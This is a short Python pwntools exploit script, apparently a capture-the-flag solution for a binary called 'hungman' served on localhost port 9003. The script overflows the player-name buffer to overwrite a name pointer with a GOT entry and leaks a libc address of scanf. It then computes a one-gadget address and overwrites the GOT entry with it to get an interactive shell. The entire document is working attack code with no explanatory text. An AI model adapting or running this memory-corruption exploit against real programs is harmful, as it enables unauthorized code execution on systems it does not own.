from pwn import *
context.log_level = "INFO"
#r = process("hungman")
r = remote("localhost", 9003)
pause()

r.sendline("A"*128)
ELF_PATH = "hungman"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
e = ELF(ELF_PATH)
lc = ELF(LIBC_PATH)
leak_func = '__isoc99_scanf'
magic_func = 0xE66BD

#send a then wrong letter 3 times
r.sendline('a')
r.sendline('a')
r.sendline('a')
r.sendline('a')
r.sendline('y')

score = p32(0xffffffff)
namelen = p32(0x100)
nameptr = p64(e.got[leak_func])
pl = 'A'*144 + score + namelen + nameptr

r.sendline(pl)
r.recvuntil("Highest player: ")

libcleak = int(u64(r.recv(0x6)+'\x00\x00'))
log.info("leak@libc {:#x}".format(libcleak))
r.sendline('y')

r.sendline('a')
r.sendline('a')
r.sendline('a')
r.sendline('a')
r.sendline('y')

offset = lc.symbols[leak_func] - magic_func
log.info("Offset {:#x}".format(offset))
log.info("Jump to {:#x}".format(libcleak-offset))
pause()
r.sendline(p64(libcleak-offset))

r.clean()
r.interactive()
